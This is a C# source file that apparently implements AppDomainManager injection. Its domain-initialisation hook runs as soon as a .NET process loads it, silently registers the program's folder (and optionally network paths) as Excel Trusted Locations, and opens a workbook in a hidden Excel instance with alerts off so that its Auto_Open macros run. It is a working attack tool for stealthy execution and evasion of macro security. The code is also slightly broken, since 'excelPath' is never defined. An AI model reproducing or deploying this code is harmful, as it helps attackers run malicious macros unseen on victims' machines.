using System;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;

public sealed class MyAppDomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        ClassExample.Execute();
    }
}

public class ClassExample
{
    public static bool Execute()
    {
        object excelApp = null;
        object workbook = null;

        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;

            if (!File.Exists(excelPath))
                throw new FileNotFoundException($"Excel file not found: {excelPath}");

            AddExcelTrustedLocation(baseDir);

            Type excelType = Type.GetTypeFromProgID("Excel.Application", true);
            excelApp = Activator.CreateInstance(excelType);

            // Set properties
            excelApp.GetType().InvokeMember("Visible", 
                System.Reflection.BindingFlags.SetProperty, null, excelApp, new object[] { false });

            excelApp.GetType().InvokeMember("DisplayAlerts", 
                System.Reflection.BindingFlags.SetProperty, null, excelApp, new object[] { false });

            // Open the workbook (this runs Auto_Open / Workbook_Open macros)
            object workbooks = excelApp.GetType().InvokeMember("Workbooks", 
                System.Reflection.BindingFlags.GetProperty, null, excelApp, null);

            workbook = workbooks.GetType().InvokeMember("Open",
                System.Reflection.BindingFlags.InvokeMethod,
                null,
                workbooks,
                new object[] { excelPath, false, false, Type.Missing, Type.Missing, Type.Missing, 
                               Type.Missing, Type.Missing, Type.Missing, Type.Missing, 
                               Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing });


            return true;
        }
        catch (Exception ex)
        {
            return false;
        }
        finally
        {
            if (workbook != null)
            {
                try
                {
                    workbook.GetType().InvokeMember("Close", 
                        System.Reflection.BindingFlags.InvokeMethod, null, workbook, new object[] { false });
                }
                catch { }
            }

            if (excelApp != null)
            {

            }
        }
    }

    private static void AddExcelTrustedLocation(string folderPath)
    {
        string[] officeVersions = { "16.0", "15.0", "14.0", "12.0" };
        foreach (string version in officeVersions)
        {
            string baseKey = $@"Software\Microsoft\Office\{version}\Excel\Security\Trusted Locations";
            using (RegistryKey root = Registry.CurrentUser.OpenSubKey(baseKey, true))
            {
                if (root == null) continue;

                int locationIndex = 0;
                string locationKeyName;
                do
                {
                    locationKeyName = $"Location{locationIndex}";
                    using (RegistryKey existing = root.OpenSubKey(locationKeyName))
                    {
                        if (existing == null) break;
                        locationIndex++;
                    }
                } while (true);

                using (RegistryKey newLoc = root.CreateSubKey(locationKeyName))
                {
                    if (newLoc != null)
                    {
                        newLoc.SetValue("Path", folderPath.TrimEnd('\\') + "\\", RegistryValueKind.String);
                        newLoc.SetValue("AllowSubFolders", 1, RegistryValueKind.DWord);
                        newLoc.SetValue("Description", "Auto-added trusted location for macro execution", RegistryValueKind.String);
                    }
                }
            }
        }
    }

    private static void EnableNetworkTrustedLocations()
    {
        string[] officeVersions = { "16.0", "15.0", "14.0", "12.0" };
        foreach (string version in officeVersions)
        {
            string keyPath = $@"Software\Microsoft\Office\{version}\Excel\Security\Trusted Locations";
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
            {
                key?.SetValue("AllowNetworkLocations", 1, RegistryValueKind.DWord);
            }
        }
    }
}